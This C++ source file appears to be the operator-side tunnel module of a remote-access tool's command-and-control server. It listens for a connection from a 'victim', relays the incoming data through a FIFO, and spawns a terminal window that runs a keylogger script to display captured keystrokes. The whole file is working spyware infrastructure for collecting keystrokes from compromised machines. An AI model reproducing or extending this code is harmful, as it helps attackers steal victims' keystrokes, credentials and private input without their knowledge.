#include "spy_tunnel.hpp"
#include <sys/eventfd.h>

int SpyTunnel::init(const std::string& __ip, uint __port, int*& __p_tunnel_shutdown_fd, int __connection_type) {    
    memset(&tunnel_addr_, 0, sizeof(tunnel_addr_));
    tunnel_addr_.sin_family = AF_INET;
    tunnel_addr_.sin_port = htons(__port);
    if (inet_pton(AF_INET, __ip.c_str(), &tunnel_addr_.sin_addr) <= 0) {
        return -1;
    }
    tunnel_socket_ = socket(AF_INET, __connection_type, 0);
    if (tunnel_socket_ == -1) {
        return -1;
    }

    int opt = 1;
    setsockopt(tunnel_socket_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));


    if (bind(tunnel_socket_, (struct sockaddr*)&tunnel_addr_, sizeof(tunnel_addr_)) == -1) {
        close(tunnel_socket_);
        return -1;
    }

    if (listen(tunnel_socket_, 1) == -1) {
        close(tunnel_socket_);
        return -1;
    }
    __p_tunnel_shutdown_fd = &tunnel_shutdown_fd_.fd;

    return 0;
}

// Child process spawning the window
// Parent process will be communicating with the tunnel (victim) and forwarding packets to the fifo
void SpyTunnel::run() {
    pid_ = fork();
    if (pid_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error creating child process" << RESET;
        return;
    } else if (pid_ == 0) {
        spawn_window();
        _exit(EXIT_FAILURE);
    }

    int tries = 0;
    while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    if (tunnel_fifo_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
        return;
    }
    
    ScopedEpollFD epoll_fd;
    epoll_fd.fd = epoll_create1(0);
    if (epoll_fd.fd == -1) {
        write_fifo_error("[SpyTunnel::run] Error creating epoll instance " + std::string(strerror(errno)));
        return;
    }
    
    tunnel_end_socket_ = accept_tunnel_end();
    if (tunnel_end_socket_ == -1) {
        return;
    }

    struct epoll_event tunnel_end_event;
    tunnel_end_event.data.fd = tunnel_end_socket_;
    tunnel_end_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &tunnel_end_event) == -1) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel end socket to epoll " + std::string(strerror(errno)));
        return;
    }

    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
    if (tunnel_shutdown_fd_.fd == -1) {
        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
        return;
    }

    struct epoll_event shutdown_event;
    shutdown_event.data.fd = tunnel_shutdown_fd_.fd;
    shutdown_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_shutdown_fd_.fd, &shutdown_event) == -1) {
        write_fifo_error("[SpyTunnel::run] Error adding shutdown eventfd to epoll " + std::string(strerror(errno)));
        return;
    }
    
    char buf[MAX_BUFFER_SIZE];

    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
        if (nfds < 0) {
            if (errno == EINTR) {
                continue;
            }
            write_fifo_error("[SpyTunnel::run] Error waiting for epoll event " + std::string(strerror(errno)));
            break;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                std::cout << MAGENTA << "[SpyTunnel::run] Shutdown signal received" << RESET;
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                }
                return;
            } else if(events[i].data.fd == tunnel_end_socket_) {
                int bytes_read = recv(tunnel_end_socket_, buf, sizeof(buf), 0);
                if (bytes_read < 0) {
                    write_fifo_error("[SpyTunnel::run] Error receiving data from tunnel end socket " + std::string(strerror(errno)));
                    return;
                } else if (bytes_read == 0) {
                    write_fifo_error("[SpyTunnel::run] Tunnel end socket closed by the peer");
                    return;
                } else {
                    write(tunnel_fifo_, buf, bytes_read);
                }
            }
        }
    }

}

int SpyTunnel::accept_tunnel_end() {
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;

    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(tunnel_socket_, &read_fds);

    int rc = select(tunnel_socket_ + 1, &read_fds, nullptr, nullptr, &timeout);
    if (rc == -1) {
        write_fifo_error("[SpyTunnel::accept_tunnel_end] Error in select " + std::string(strerror(errno)));
        return -1;
    } else if (rc == 0) {
        write_fifo_error("[SpyTunnel::accept_tunnel_end] Timeout occured waiting for tunnel end. Please rerun the command");
        return -1;
    }

    // Socket is ready for accepting
    return accept(tunnel_socket_, nullptr, nullptr);
}

void SpyTunnel::edit_path(int __client_index, CommandCode __command_code) {
    if (__command_code == KEYLOGGER) {
        fifo_path_ = KEYLOGGER_FIFO_PATH + std::to_string(__client_index);
    }
}

void SpyTunnel::shutdown() {
    if (pid_ > 0) {
        kill(pid_, SIGTERM);
        waitpid(pid_, nullptr, 0);
    }

    if (tunnel_socket_ != -1) {
        close(tunnel_socket_);
    }

    if (tunnel_end_socket_ != -1) {
        close(tunnel_end_socket_);
    }
}

void SpyTunnel::write_fifo_error(const std::string& __msg) {
    if (tunnel_fifo_ != -1) {
        std::string error = __msg + "[__error__]\n";
        write(tunnel_fifo_, error.c_str(), error.length());
    } else {
        std::cerr << RED << "[SpyTunnel::write_fifo_error] " << __msg << RESET;
    }
}

void Keylogger::spawn_window() {
    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), (char*)NULL);
}

Tunnel::Tunnel(int __client_index, CommandCode __command_code, SpyTunnel* __p_spy_tunnel) {
    command_code_ = __command_code;
    client_index_ = __client_index;
    p_spy_tunnel_ = __p_spy_tunnel;
    p_tunnel_shutdown_fd_ = nullptr;
}

std::atomic<int> Tunnel::active_tunnels_ = 0;

void erase_tunnel(std::vector<Tunnel*>* __p_tunnels, int __client_index, CommandCode __command_code) {
    auto it = std::remove_if(
        __p_tunnels->begin(), 
        __p_tunnels->end(),
        [=](Tunnel* tunnel) {
            bool should_erase = (tunnel->client_index_ == __client_index && tunnel->command_code_ == __command_code); 
            if (should_erase) {
                delete tunnel->p_spy_tunnel_;
                delete tunnel;
            }
            return should_erase;
        }
    );

    __p_tunnels->erase(it, __p_tunnels->end()); // Reorganize the vector
}

void SpyTunnel::spawn_window() {
    // Overridden
}

